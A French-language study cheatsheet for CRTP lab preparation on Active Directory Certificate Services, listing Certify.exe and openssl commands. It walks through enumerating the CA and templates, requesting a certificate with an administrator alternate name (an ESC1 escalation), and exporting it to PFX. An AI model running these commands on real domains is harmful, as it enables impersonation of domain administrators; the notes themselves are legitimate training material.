# Cheatsheet - AD CS et certificats

> [!summary] Objectif
> Préparer une base de travail sur AD CS, les templates de certificats et les premières commandes d'énumération du module.

> [!warning] Cadre d'utilisation
> À utiliser uniquement dans un environnement de lab autorisé, dans le cadre de l'apprentissage et de la préparation CRTP.

## Quand utiliser cette fiche

- Quand le parcours arrive sur `AD CS`, `Certify`, `Certificate Request Agent` ou `HTTPSCertificates`.
- Quand une élévation ou une persistance repose sur un template de certificat.

## Prérequis

- `Certify.exe` disponible sur la VM du lab.
- Le nom de la CA et des templates concernés.

## Commandes

### Objectif

Identifier la CA du domaine.

### Commande

```powershell
C:\AD\Tools\Certify.exe cas
```

### Explication

Permet de vérifier qu'AD CS est présent et de récupérer le nom de la CA cible.

### Contexte d’utilisation

Point d'entrée naturel avant toute recherche de template.

### Précautions

Noter le nom exact de la CA avant de passer aux templates.

### Objectif

Lister les templates et filtrer ceux qui semblent intéressants.

### Commande

```powershell
C:\AD\Tools\Certify.exe find
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
```

### Explication

Le PDF s'appuie sur `find` pour lister les templates puis sur `find /enrolleeSuppliesSubject` pour cibler des templates du type `HTTPSCertificates`.

### Contexte d’utilisation

Étape logique avant une requête de certificat.

### Précautions

Noter les templates liés à `Certificate Request Agent` et ceux qui autorisent `ENROLLEE_SUPPLIES_SUBJECT`.

### Objectif

Demander un certificat sur un template ciblé.

### Commande

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorpdc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates"
```

### Explication

Commande alignée sur l'exemple du lab autour du template `HTTPSCertificates`.

### Contexte d’utilisation

À utiliser lorsque le template vulnérable a déjà été identifié.

### Précautions

Documenter le template, la CA et le contexte utilisateur utilisés pour la requête.

### Objectif

Demander un certificat avec `altname` si le scénario le prévoit.

### Commande

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorpdc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```

### Explication

Prépare les scénarios de lab où le template permet de contrôler certains attributs de la demande.

### Contexte d’utilisation

À n'utiliser que quand le template identifié permet effectivement ce comportement.

### Précautions

Vérifier les propriétés du template avant de lancer une requête avec `altname`.

### Objectif

Convertir le certificat retourné en PFX.

### Commande

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```

### Explication

Le PDF convertit ensuite le certificat PEM en PFX pour l'étape suivante du module.

### Contexte d’utilisation

Fiche prête pour la suite du workflow AD CS quand tu aborderas réellement ce bloc.

### Précautions

Conserver le nom du fichier et le mot de passe d'export utilisé dans tes notes de lab.

### Notes associées

- [[Synthèse - AD CS]]
- [[Cheatsheet - Trusts et forêts]]
- [[Attaques AD - MOC]]
- [[Labs - MOC]]
